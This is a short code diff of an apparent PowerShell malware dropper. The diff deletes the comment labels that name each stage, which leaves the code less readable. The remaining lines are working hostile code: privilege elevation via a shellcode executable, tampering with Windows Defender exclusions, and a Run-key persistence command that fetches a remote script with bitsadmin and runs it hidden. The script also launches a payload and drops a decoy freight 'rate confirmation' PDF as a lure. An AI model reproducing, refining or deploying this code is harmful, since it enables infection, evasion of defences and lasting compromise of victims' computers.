@@ -125,7 +125,7 @@ function _runArg($n,$a,$s,$l){
     }
 }
 
-# ELEVATION (if needed)
+
 if(-not $cbIsAdmin){
     _run 'ElevatorShellCode.exe' 'S1' 'elev'
     Start-Sleep 6
@@ -134,7 +134,7 @@ if(-not $cbIsAdmin){
     if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail'}
 }
 
-# DEFENDER DISABLE — first priority
+
 if($cbIsAdmin){
     try{
         $mp='Add-MpPreference'
@@ -159,7 +159,7 @@ if($cbIsAdmin){
     _cb 'S2' 'skip' 'no admin'
 }
 
-# PERSISTENCE
+
 $persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
 try{
     $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -192,10 +192,10 @@ if($cbIsAdmin){
 
 _cb 'S3' 'ok' 'persist ok'
 
-# MAIN PAYLOAD
+
 _run 'PatchPulsaar.exe' 'S5' 'payload'
 
-# DECOY PDF
+
 $pdf='Rate_Confirmation_LD-2026-0847.pdf'
 $pdfPath="$env:USERPROFILE\Downloads\$pdf"
 $pdfBytes=_dl $pdf
